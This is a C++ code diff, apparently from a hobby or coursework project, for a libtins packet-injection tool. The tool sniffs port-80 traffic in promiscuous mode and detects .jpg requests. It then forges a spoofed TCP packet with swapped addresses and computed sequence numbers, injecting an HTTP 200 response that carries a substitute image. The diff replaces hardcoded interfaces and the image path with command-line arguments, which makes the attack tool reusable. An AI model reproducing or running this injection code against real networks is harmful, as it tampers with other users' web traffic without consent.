@@ -4,16 +4,19 @@
 #include <algorithm>
 #include <fstream>
 #include <regex>
+#include <tins/network_interface.h>
 using namespace Tins;
 using namespace std;
 string mac = "24:05:0f:30:ad:6b";
+char *sf_dev;
+char *sd_dev;
+char *path;
 struct pk_set
 {
     typedef HWAddress<6> address;
     EthernetII new_ethernet;
     IP new_ip;
     TCP new_tcp;
-    uint32_t new_seq, new_ack;
     PacketSender sender;
     uint8_t *image;
     u_int32_t len;
@@ -24,21 +27,16 @@ struct pk_set
         std::regex pattern(".jpg");
         std::smatch result;
         if(std::regex_search(data, result, pattern))
-
             return true;
         else
             return false;
     }
-
     void image_f()
     {
-        string path;
-        cout<<"HTML PATH : ";
-        //FILE *fp = fopen(path.c_str(),"rb");
-        FILE *fp = fopen("/var/www/html/hacking2.JPG","rb");
+        FILE *fp = fopen(path,"rb");
         fseek(fp,0,SEEK_END);//moving list array
         len = ftell(fp);
-        cout<<len<<endl;
+        cout<<"file size : "<<len<<"\n";
         fseek(fp,0,SEEK_SET);//moving start array
         image = (uint8_t *)malloc(len);
         if(fread(image,len,1,fp))
@@ -47,7 +45,6 @@ struct pk_set
             cout<<"reading data failed\n";
         fclose(fp);
     }
-
     void sf_set()
     {
 
@@ -56,10 +53,9 @@ struct pk_set
         config.set_filter("port 80");
         config.set_promisc_mode(true);
         config.set_timeout(0.001);
-        Sniffer sniffer("tap0", config);
+        Sniffer sniffer(sf_dev, config);
         sniffer.sniff_loop(make_sniffer_handler(this, &pk_set::handle));
     }
-
     void debug(EthernetII ethernet, IP ip, TCP tcp)
     {
         cout<<"ethernet<src /dst> :"<<hex<<ethernet.src_addr()<<" / "<<ethernet.dst_addr()<<"\n";
@@ -68,40 +64,31 @@ struct pk_set
         cout<<"Tcp port<src /dst> :"<<hex<<tcp.sport()<<" / "<<tcp.dport()<<"\n";
         cout<<"tcp.seq num : "<<hex<<tcp.seq()<<"\n";
         cout<<"tcp.ack num : "<<hex<<tcp.ack_seq()<<"\n";
-        cout<<"tcp offset : "<<tcp.flags()<<"\n";
+        cout<<"tcp flag : "<<tcp.flags()<<"\n";
         cout<<"tcp ack : "<<tcp.ACK<<"\n";
         cout<<"tcp psh : "<<tcp.PSH<<"\n";
         cout<<"tcp Check sum :"<<tcp.checksum()<<"\n";
     }
-
-    bool pk_swap(EthernetII ethernet, IP ip, TCP tcp)
+    void pk_swap(EthernetII ethernet, IP ip, TCP tcp)
     {
-
-        //swap
         new_ethernet.src_addr(address(mac));
         new_ethernet.dst_addr(ethernet.src_addr());
-        //swap
         new_ip.src_addr(ip.dst_addr());
         new_ip.dst_addr(ip.src_addr());
-        new_ip.flags();
-        //swap
         new_tcp.sport(tcp.dport());
         new_tcp.dport(tcp.sport());
         new_tcp.flags(0x18);
-        return true;
     }
     void tcp_caculator(TCP tcp,uint32_t payload_len)
     {
-        new_seq = tcp.ack_seq(); // caclulator
-        new_ack = tcp.seq() + payload_len; //caclulator
-        new_tcp.seq(new_seq);
-        new_tcp.ack_seq(new_ack);
+        new_tcp.seq(tcp.ack_seq());
+        new_tcp.ack_seq(tcp.seq() + payload_len);
     }
     void chg_send()
     {
-        EthernetII psh_attack = new_ethernet / new_ip / new_tcp/RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\nContent-Length: 1448\n\n")/RawPDU((const uint8_t *)image,len);
-        sender.send(psh_attack, "wlx24050f30ad6b");
-        debug(new_ethernet,new_ip,new_tcp);
+        EthernetII psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\nContent-Length: 1448\n\n")/RawPDU((const uint8_t *)image,len);
+        sender.send(psh_attack, sd_dev);
+        //debug(new_ethernet,new_ip,new_tcp);
     }
     bool handle(PDU& pdu)
     {
@@ -110,9 +97,9 @@ struct pk_set
         const TCP &tcp = pdu.rfind_pdu<TCP>();
         const RawPDU& raw = tcp.rfind_pdu<RawPDU>();
         const RawPDU::payload_type& payload = raw.payload();
-        pk_swap(ethernet,ip,tcp);
-        if(tcp.ACK == 0x10 && tcp.PSH == 0x08 && tcp.dport() == 0x50 && web_image((char *)payload.data()) == true)
+        if(tcp.flags() == 0x18 && tcp.dport() == 0x50 && web_image((char *)payload.data()) == true)
         {
+            pk_swap(ethernet,ip,tcp);
             tcp_caculator(tcp,payload.size());
             chg_send();
             cout<<"request packet "<<"\n";
@@ -121,12 +108,30 @@ struct pk_set
         }
         return true;
     }
-    };
-//problem : speed.....
-    int main()
+};
+bool check(int argc, char *argv[])
+{
+    if(argc == 4)
     {
+        sf_dev = argv[1];
+        sd_dev = argv[2];
+        path = argv[3];
+        return true;
+    }
+
+    else
+    {
+        cout<<"<sniffing dev> <send dev> <jpg path>\n";
+        return false;
+    }
+
+}
+
+int main(int argc, char *argv[])
+{
+    if(check(argc,argv) == false) exit(1);
     pk_set ps;
     ps.image_f();
     ps.sf_set();
-    }
+}
 
